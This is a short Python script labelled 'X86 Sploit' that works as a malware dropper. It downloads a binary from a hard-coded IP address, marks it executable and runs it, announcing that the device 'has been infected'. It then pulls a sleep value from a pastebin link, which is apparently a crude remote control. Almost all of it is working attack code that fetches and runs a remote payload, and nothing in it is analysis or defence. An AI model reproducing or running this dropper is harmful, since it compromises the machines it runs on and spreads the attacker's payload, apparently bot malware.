import urllib.request
import time
import requests
import os
from os import system

print("X86 Sploit Made by @0x16b X @Queered")
time.sleep(3)
print("Downloading & Uploading bins")
time.sleep(3)
urllib.request.urlretrieve("http://193.47.61.141/infs.x86","infs")
time.sleep(3)
print("done downloading :)")
time.sleep(3)
print("ready to infect this hoe???")
print("infecting . . .")
time.sleep(3)
os.system("chmod +x infs; ./infs x86")
print("Device has been infected")
pastebin_raw_link = 'https://pastebin.com/raw/ZWzK047T'
response = requests.get(pastebin_raw_link)
skid = response.content
time.sleep(int(skid))
